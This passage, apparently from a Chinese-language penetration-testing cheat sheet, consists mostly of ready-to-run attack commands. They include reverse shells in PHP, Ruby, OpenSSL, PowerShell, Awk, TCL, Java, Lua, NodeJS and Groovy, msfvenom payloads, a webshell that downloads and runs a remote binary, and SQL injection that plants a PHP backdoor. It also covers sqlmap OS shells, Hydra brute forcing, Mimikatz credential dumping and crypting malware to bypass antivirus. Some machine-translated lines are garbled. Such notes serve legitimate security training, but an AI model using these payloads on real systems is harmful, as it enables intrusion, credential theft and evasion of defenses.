&#39;$s=\&#39;127.0.0.1\&#39;;$p=443;@error_reporting(0);@ini_set(&quot;error_log&quot;,NULL);@ini_set(&quot;log_errors&quot;,0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\&#39;/bin/sh$IFS-i\&#39;,array(array(\&#39;pipe\&#39;,\&#39;r\&#39;),array(\&#39;pipe\&#39;,\&#39;w\&#39;),array(\&#39;pipe\&#39;,\&#39;w\&#39;)),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\&#39;connection/closed\&#39;);if(feof($p[1]))die(\&#39;shell/not/response\&#39;);$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die(&quot;proc_open/disabled&quot;);}}else{die(&quot;not/connect&quot;);}&#39;</code></pre><h4 id="10、利用Ruby脚本反弹shell"><a href="#10、利用Ruby脚本反弹shell" class="headerlink" title="10、利用Ruby脚本反弹shell"></a>10、利用Ruby脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.10.10.11&quot;,443).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></pre><pre><code class="bash">ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;10.10.10.11&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code></pre><p>Windows平台如下：</p><pre><code class="bash">ruby -rsocket -e &#39;c=TCPSocket.new(&quot;10.10.10.11&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code></pre><h4 id="11、使用OpenSSL反弹shell"><a href="#11、使用OpenSSL反弹shell" class="headerlink" title="11、使用OpenSSL反弹shell"></a>11、使用OpenSSL反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre><pre><code class="bash">openssl s_server -quiet -key key.pem -cert cert.pem -port 443</code></pre><pre><code class="bash">ncat --ssl -vv -l -p 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 10.10.10.11:443 &gt; /tmp/s; rm /tmp/s</code></pre><h4 id="12、win平台下使用Powershell反弹shell"><a href="#12、win平台下使用Powershell反弹shell" class="headerlink" title="12、win平台下使用Powershell反弹shell"></a>12、win平台下使用Powershell反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;10.10.10.11&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code></pre><pre><code class="bash">powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.10.11&#39;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></pre><pre><code class="bash">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#39;)</code></pre><h4 id="13、利用Awk反弹shell"><a href="#13、利用Awk反弹shell" class="headerlink" title="13、利用Awk反弹shell"></a>13、利用Awk反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">awk &#39;BEGIN {s = &quot;/inet/tcp/0/10.10.10.11/443&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#39; /dev/null</code></pre><h4 id="14、TCL脚本反弹shell"><a href="#14、TCL脚本反弹shell" class="headerlink" title="14、TCL脚本反弹shell"></a>14、TCL脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">echo &#39;set s [socket 10.10.10.11 443];while 42 { puts -nonewline $s &quot;shell&gt;&quot;;flush $s;gets $s c;set e &quot;exec $c&quot;;if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;&#39; | tclsh</code></pre><h4 id="15、Java版本反弹shell"><a href="#15、Java版本反弹shell" class="headerlink" title="15、Java版本反弹shell"></a>15、Java版本反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><p>linux平台：</p><pre><code class="java">r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()</code></pre><p>windows平台：</p><pre><code class="java">String host=&quot;127.0.0.1&quot;;int port=4444;String cmd=&quot;cmd.exe&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</code></pre><p>创建线程：</p><pre><code class="java">Thread thread = new Thread(){    public void run(){        // Reverse shell here    }}thread.start();</code></pre><h4 id="16、生成War文件反弹shell"><a href="#16、生成War文件反弹shell" class="headerlink" title="16、生成War文件反弹shell"></a>16、生成War文件反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>使用如下命令生成war文件：</p><pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f war &gt; reverse.war</code></pre><p>查看war包中shell的jsp文件名</p><pre><code class="bash">strings reverse.war | grep jsp</code></pre><p>在靶机上部署war包后，访问shell的jsp文件，即可在监听端口获得反弹shell</p><h4 id="17、使用Lua脚本反弹shell"><a href="#17、使用Lua脚本反弹shell" class="headerlink" title="17、使用Lua脚本反弹shell"></a>17、使用Lua脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：<br>Linux平台：</p><pre><code class="bash">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;10.10.10.11&#39;,&#39;443&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</code></pre><p>Windows及Linux平台：</p><pre><code class="bash">lua5.1 -e &#39;local host, port = &quot;10.10.10.11&quot;, 443 local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#39;</code></pre><h4 id="18、NodeJS版本反弹shell"><a href="#18、NodeJS版本反弹shell" class="headerlink" title="18、NodeJS版本反弹shell"></a>18、NodeJS版本反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="js">(function(){    var net = require(&quot;net&quot;),        cp = require(&quot;child_process&quot;),        sh = cp.spawn(&quot;/bin/sh&quot;, []);    var client = new net.Socket();    client.connect(443, &quot;10.10.10.11&quot;, function(){        client.pipe(sh.stdin);        sh.stdout.pipe(client);        sh.stderr.pipe(client);    });    return /a/; })();</code></pre><pre><code class="js">require(&#39;child_process&#39;).exec(&#39;nc -e /bin/sh 10.10.10.11 443&#39;)</code></pre><pre><code class="js">-var x = global.process.mainModule.require-x(&#39;child_process&#39;).exec(&#39;nc 10.10.10.11 443 -e /bin/bash&#39;)</code></pre><pre><code class="bash">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</code></pre><h4 id="19、Groovy版本反弹shell"><a href="#19、Groovy版本反弹shell" class="headerlink" title="19、Groovy版本反弹shell"></a>19、Groovy版本反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">String host=&quot;10.10.10.11&quot;;int port=443;String cmd=&quot;cmd.exe&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</code></pre><h4 id="20、生成Meterpreter反弹Shell"><a href="#20、生成Meterpreter反弹Shell" class="headerlink" title="20、生成Meterpreter反弹Shell:"></a>20、生成Meterpreter反弹Shell:</h4><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</code></pre><pre><code class="bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</code></pre><pre><code class="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</code></pre><pre><code class="bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</code></pre><pre><code class="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f elf &gt; shell.elf</code></pre><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f exe &gt; shell.exe</code></pre><pre><code class="bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f macho &gt; shell.macho</code></pre><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f asp &gt; shell.asp</code></pre><pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.jsp</code></pre><pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f war &gt; shell.war</code></pre><pre><code class="bash">msfvenom -p cmd/unix/reverse_python LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.py</code></pre><pre><code class="bash">msfvenom -p cmd/unix/reverse_bash LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.sh</code></pre><pre><code class="bash">msfvenom -p cmd/unix/reverse_perl LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.pl</code></pre><h4 id="21、使用Xterm反弹shell"><a href="#21、使用Xterm反弹shell" class="headerlink" title="21、使用Xterm反弹shell"></a>21、使用Xterm反弹shell</h4><p>首先在本地监听TCP协议443端口</p><pre><code class="bash">nc -lvp 443</code></pre><p>然后在靶机上执行如下命令：</p><pre><code class="bash">xterm -display 10.10.10.11:1Xnest :1xhost +targetip</code></pre><p>参考链接：<br><a href="https://krober.biz/misc/reverse_shell.php?ip=10.10.10.11&amp;port=443" target="_blank" rel="noopener">https://krober.biz/misc/reverse_shell.php?ip=10.10.10.11&amp;port=443</a></p><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>后期攻击是指攻击者在对目标获得某种程度的控制后所执行的操作。</p><ul><li><p>简单的本地Web服务器</p><ul><li>运行基本的http服务器，非常适合提供shell等服务<br>python -m SimpleHTTPServer 80</li><li>运行基本的Python3 http服务器，非常适合提供shell等<br>python3 -m http.server</li><li>运行ruby webrick基本的http服务器<br>ruby -rwebrick -e“ WEBrick :: HTTPServer.new<br>（：Port =&gt; 80，：DocumentRoot =&gt; Dir.pwd）.start”</li><li>运行基本的PHP http服务器<br>php -S $ ip：80</li></ul></li><li><p>在Windows上创建wget VB脚本：<a href="http://web.archive.org/web/20171113221652/https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt" target="_blank" rel="noopener"><em>https</em></a> :<br><a href="http://web.archive.org/web/20171113221652/https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt" target="_blank" rel="noopener"><em>//github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt</em></a></p></li><li><p>可以粘贴到命令行的Windows文件传输脚本。没有Meterpreter外壳，将文件传输到Windows机器可能很棘手。可以将以下脚本复制并粘贴到基本的Windows反向窗口中，并用于从Web服务器传输文件（每行之后都需要timeout 1命令）：</p><pre><code> echo Set args = Wscript.Arguments  &gt;&gt; webdl.vbs timeout 1 echo Url = &quot;http://1.1.1.1/windows-privesc-check2.exe&quot;  &gt;&gt; webdl.vbs timeout 1 echo dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)  &gt;&gt; webdl.vbs timeout 1 echo dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)  &gt;&gt; webdl.vbs timeout 1 echo xHttp.Open &quot;GET&quot;, Url, False  &gt;&gt; webdl.vbs timeout 1 echo xHttp.Send  &gt;&gt; webdl.vbs timeout 1 echo with bStrm      &gt;&gt; webdl.vbs timeout 1 echo     .type = 1 &#39;      &gt;&gt; webdl.vbs timeout 1 echo     .open      &gt;&gt; webdl.vbs timeout 1 echo     .write xHttp.responseBody      &gt;&gt; webdl.vbs timeout 1 echo     .savetofile &quot;C:\temp\windows-privesc-check2.exe&quot;, 2 &#39;  &gt;&gt; webdl.vbs timeout 1 echo end with &gt;&gt; webdl.vbs timeout 1 echo</code></pre><p>可以使用以下语法运行该文件：</p><p><code>C:\temp\cscript.exe webdl.vbs</code></p></li><li><p>挂载文件共享</p><ul><li>将NFS共享<br>挂载到/ mnt / nfs 挂载$ ip：/ vol / share / mnt / nfs</li></ul></li><li><p>HTTP Put<br>nmap -p80 $ ip –script http-put –script-args http-put.url =’/ test / sicpwn.php’，http-put.file =’/ var / www / html / sicpwn.php</p></li></ul><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><ul><li><ul><li><p>SCP</p><p>scp用户名1 @ source_host：目录1 /文件名1用户名2 @ destination_host：目录2 /文件名2</p><p>scp localfile用户名@ $ ip：〜/文件夹/</p><p>scp Linux_Exploit_Suggester.pl <a href="mailto:bob@192.168.1.10">bob@192.168.1.10</a>：〜</p></li><li><p>使用Davtest的Webdav-一些系统管理员足以启用PUT方法-此工具将自动上传后门</p><p><code>davtest -move -sendbd auto -url http://$ip</code></p><p><a href="http://web.archive.org/web/20171113221652/https://github.com/cldrn/davtest" target="_blank" rel="noopener">https://github.com/cldrn/davtest</a></p><p>您还可以使用带有curl命令的PUT方法上传文件：</p><p><code>curl -T &#39;leetshellz.txt&#39; &#39;http://$ip&#39;</code></p><p>并使用带有curl命令的MOVE方法将其重命名为可执行文件：</p><p><code>curl -X MOVE --header &#39;Destination:http://$ip/leetshellz.php&#39; &#39;http://$ip/leetshellz.txt&#39;</code></p></li><li><p>使用有限的php shell cmd上传shell，使用<br>webshel​​l下载并执行meterpreter<br>[curl -s –data“ cmd = wget  <a href="http://web.archive.org/web/20171113221652/http://174.0.42.42:8000/dhn" target="_blank" rel="noopener">http://174.0.42.42:8000/dhn</a>  -O / tmp / evil” http：// $ ip / files / sh.php<br>[curl -s –data“ cmd = chmod 777 / tmp / evil” http：//$ip/files/sh.php<br>curl -s –data“ cmd = bash -c / tmp /evil”http://$ip/files/sh.php</p></li><li><p>TFTP<br>mkdir / tftp<br>atftpd-守护进程-端口69 / tftp<br>cp /usr/share/windows-binaries/nc.exe / tftp /<br>EX。从WINDOWS主机：<br>C：\ Users \ Offsec&gt; tftp -i $ ip get nc.exe</p></li><li><p>FTP<br>apt-get更新&amp;&amp; apt-get安装pure-ftpd</p><p>＃！/ bin / bash<br>groupadd ftpgroup<br>useradd -g ftpgroup -d / dev / null -s / etc ftpuser<br>pure-pw useradd offsec -u ftpuser -d / ftphome<br>pure-pw mkdb<br>cd / etc / pure-ftpd / auth /<br>ln -s ../conf/PureDB 60pdb<br>mkdir -p / ftphome<br>chown -R ftpuser：ftpgroup / ftphome /</p><p>/etc/init.d/pure-ftpd重新启动</p></li></ul></li></ul><h3 id="压缩打包文件"><a href="#压缩打包文件" class="headerlink" title="压缩打包文件"></a>压缩打包文件</h3><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h3><h3 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h3><h2 id="客户端、网页及密码攻击"><a href="#客户端、网页及密码攻击" class="headerlink" title="客户端、网页及密码攻击"></a>客户端、网页及密码攻击</h2><h3 id="客户端攻击"><a href="#客户端攻击" class="headerlink" title="客户端攻击"></a>客户端攻击</h3><h3 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h3><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><h3 id="数据库漏洞"><a href="#数据库漏洞" class="headerlink" title="数据库漏洞"></a>数据库漏洞</h3><ul><li><p>身份验证绕过</p><pre><code>  name=&#39;wronguser&#39; or 1=1;    name=&#39;wronguser&#39; or 1=1 LIMIT 1;</code></pre></li><li><p>枚举数据库</p><p><code>http://192.168.11.35/comment.php?id=738)&#39;</code></p><p>详细错误消息？</p><p><code>http://$ip/comment.php?id=738 order by 1</code></p><p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,5,6</code></p><p>确定MySQL版本：</p><p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,@@version,6</code></p><p>用于数据库连接的当前用户：</p><p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,user(),6</code></p><p>枚举数据库表和列结构</p><p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables</code></p><p>定位数据库中的用户表</p><p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name=&#39;users&#39;</code></p><p>提取名称和密码</p><p><code>http://$ip/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users</code></p><p>创建后门</p><p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,&quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot;,6 into OUTFILE &#39;c:/xampp/htdocs/backdoor.php&#39;</code></p></li><li><p>SQLMAP实例</p></li><li><p>爬网</p><p><code>sqlmap -u http://$ip --crawl=1</code></p><p><code>sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3</code></p></li><li><p>SQLMap针对可疑的GET SQL注入搜索数据库</p><p><code>sqlmap –u http://$ip/blog/index.php?search –dbs</code></p></li><li><p>GET SQL注入时从数据库oscommerce的SQLMap转储表</p><p><code>sqlmap –u http://$ip/blog/index.php?search= –dbs –D oscommerce –tables –dumps</code></p></li><li><p>SQLMap GET参数命令</p><p><code>sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --dump -threads=5</code></p></li><li><p>SQLMap发布用户名参数</p><p><code>sqlmap -u http://$ip/login.php --method=POST --data=&quot;usermail=asc@dsd.com&amp;password=1231&quot; -p &quot;usermail&quot; --risk=3 --level=5 --dbms=MySQL --dump-all</code></p></li><li><p>SQL Map OS Shell</p><p><code>sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --osshell</code></p><p><code>sqlmap -u http://$ip/login.php --method=POST --data=&quot;usermail=asc@dsd.com&amp;password=1231&quot; -p &quot;usermail&quot; --risk=3 --level=5 --dbms=MySQL --os-shell</code></p></li><li><p>自动化sqlmap扫描</p><p><code>sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read=&quot;/var/www/blah.php&quot;</code></p></li><li><p>有针对性的sqlmap扫描</p><p><code>sqlmap -u &quot;http://meh.com/meh.php?id=1&quot; --dbms=mysql --tech=U --random-agent --dump</code></p></li><li><p>使用mysql后端扫描URL进行联合+基于错误的注入，并使用随机用户代理+数据库转储</p><p><code>sqlmap -o -u http://$ip/index.php --forms --dbs</code></p><p><code>sqlmap -o -u &quot;http://$ip/form/&quot; --forms</code></p></li><li><p>Sqlmap注入检查表</p><p><code>sqlmap -o -u &quot;http://$ip/vuln-form&quot; --forms -D database-name -T users --dump</code></p></li><li><p>枚举数据库</p><p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; --dbs</code></p></li><li><p>枚举特定数据库中的表</p><p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; -D &quot;$DATABASE&quot; --tables</code></p></li><li><p>从特定的数据库和表中转储表数据</p><p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; -D &quot;$DATABASE&quot; -T &quot;$TABLE&quot; --dump</code></p></li><li><p>指定要利用的参数</p><p><code>sqlmap --dbms=mysql -u &quot;http://www.example.com/param1=value1&amp;param2=value2&quot; --dbs -p param2</code></p></li><li><p>指定要在“好的” URI中利用的参数（利用param1）</p><p><code>sqlmap --dbms=mysql -u &quot;http://www.example.com/param1/value1*/param2/value2&quot; --dbs</code></p></li><li><p>获取操作系统外壳</p><p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; --os-shell</code></p></li><li><p>获取SQL shell</p><p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; --sql-shell</code></p></li><li><p>SQL查询</p><p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; -D &quot;$DATABASE&quot; --sql-query &quot;SELECT * FROM $TABLE;&quot;</code></p></li><li><p>使用Tor Socks5代理</p><p><code>sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u &quot;$URL&quot; --dbs</code></p></li></ul><h3 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h3><ul><li><p>Mimikatz</p><ul><li><p>extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets<br><a href="http://web.archive.org/web/20171113221652/https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener"><em>https://github.com/gentilkiwi/mimikatz</em></a> From metasploit meterpreter (must have System level access):</p><pre><code>meterpreter&gt; load mimikatzmeterpreter&gt; help mimikatzmeterpreter&gt; msvmeterpreter&gt; kerberosmeterpreter&gt; mimikatz_command -f samdump::hashesmeterpreter&gt; mimikatz_command -f sekurlsa::searchPasswords</code></pre></li></ul></li><li><p>Hydra</p><ul><li><p>Hydra brute force against SNMP    //暴力破解</p><p><code>hydra -P password-file.txt -v $ip snmp</code></p></li><li><p>Hydra FTP known user and rockyou password list</p><p><code>hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp</code></p></li><li><p>Hydra SSH using list of users and passwords</p><p><code>hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh</code></p></li><li><p>Hydra SSH using a known password and a username list</p><p><code>hydra -v -V -u -L users.txt -p &quot;&lt;known password&gt;&quot; -t 1 -u $ip ssh</code></p></li><li><p>Hydra SSH Against Known username on port 22</p><p><code>hydra $ip -s 22 ssh -l &lt;user&gt; -P big_wordlist.txt</code></p></li><li><p>Hydra POP3 Brute Force</p><p><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V</code></p></li><li><p>Hydra SMTP Brute Force</p><p><code>hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V</code></p></li><li><p>Hydra attack http get 401 login with a dictionary</p><p><code>hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin</code></p></li><li><p>Hydra attack Windows Remote Desktop with rockyou</p><p><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip</code></p></li><li><p>Hydra brute force SMB user with rockyou:</p><p><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb</code></p></li><li><p>Hydra brute force a Wordpress admin login</p><p><code>hydra -l admin -P ./passwordlist.txt $ip -V http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</code></p></li></ul></li></ul><h3 id="密码哈希攻击"><a href="#密码哈希攻击" class="headerlink" title="密码哈希攻击"></a>密码哈希攻击</h3><ul><li><p>在线密码破解<br><a href="http://web.archive.org/web/20171113221652/https://crackstation.net/" target="_blank" rel="noopener"><em>https://crackstation.net/</em> </a> <a href="http://web.archive.org/web/20171113221652/http://finder.insidepro.com/" target="_blank" rel="noopener"><em>http://finder.insidepro.com/</em></a></p></li><li><p>Hashcat需要安装新的驱动程序才能使我的GPU Cracking在Kali linux VM上运行，并且我还必须使用–force参数。</p><pre><code>apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev</code></pre><p>和</p><pre><code>apt-get install pocl-opencl-icd</code></pre></li></ul><h2 id="网络隧道，端口转发"><a href="#网络隧道，端口转发" class="headerlink" title="网络隧道，端口转发"></a>网络隧道，端口转发</h2><h2 id="Metasploit框架"><a href="#Metasploit框架" class="headerlink" title="Metasploit框架"></a>Metasploit框架</h2><ul><li><p>Metasploit</p><ul><li><p>MetaSploit需要Postfresql</p><p><code>systemctl start postgresql</code></p></li><li><p>在启动时启用Postgresql</p><p><code>systemctl enable postgresql</code></p></li></ul></li><li><p>MSF语法</p><ul><li><p>开始metasploit</p><p><code>msfconsole</code></p><p><code>msfconsole -q</code></p></li><li><p>显示命令帮助</p><p><code>show -h</code></p></li><li><p>显示辅助模块</p><p><code>show auxiliary</code></p></li><li><p>使用模块</p><pre><code>use auxiliary/scanner/snmp/snmp_enum  use auxiliary/scanner/http/webdav_scanner  use auxiliary/scanner/smb/smb_version  use auxiliary/scanner/ftp/ftp_login  use exploit/windows/pop3/seattlelab_pass</code></pre></li><li><p>显示模块的基本信息</p><p><code>info</code></p></li><li><p>显示模块的配置参数</p><p><code>show options</code></p></li><li><p>设置模块的选项</p><pre><code>set RHOSTS 192.168.1.1-254  set THREADS 10</code></pre></li><li><p>运行模块</p><p><code>run</code></p></li><li><p>执行漏洞利用</p><p><code>exploit</code></p></li><li><p>搜索模块</p><p><code>search type:auxiliary login</code></p></li></ul></li><li><p>Metasploit数据库访问</p><ul><li><p>显示在MSF数据库中发现的所有主机</p><p><code>hosts</code></p></li><li><p>扫描主机并将其存储在MSF数据库中</p><p><code>db_nmap</code></p></li><li><p>在机器上搜索MSF数据库中的特定端口</p><p><code>services -p 443</code></p></li><li><p>利用MSF数据库扫描SMB端口（自动完成的Rhost）</p><p><code>services -p 443 --rhosts</code></p></li></ul></li><li><p>分阶段和非分阶段</p><ul><li>非分段有效负载-是一次完整发送的有效负载</li><li>分阶段-分两部分发送没有足够的缓冲区空间或需要绕过防病毒</li></ul></li></ul><h2 id="绕过防病毒软件"><a href="#绕过防病毒软件" class="headerlink" title="绕过防病毒软件"></a>绕过防病毒软件</h2><ul><li><p>使用软件保护程序加密已知恶意软件</p><ul><li><p>一种这样的开源加密程序称为Hyperion</p><pre><code>cp /usr/share/windows-binaries/Hyperion-1.0.zip   解压缩Hyperion-1.0.zip   cd Hyperion-1.0 /   i686-w64-mingw32-g ++ Src / Crypter / * .cpp -o   hyperion.exe cp -p / usr /lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll 。  cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll 。  酒hyperion.exe 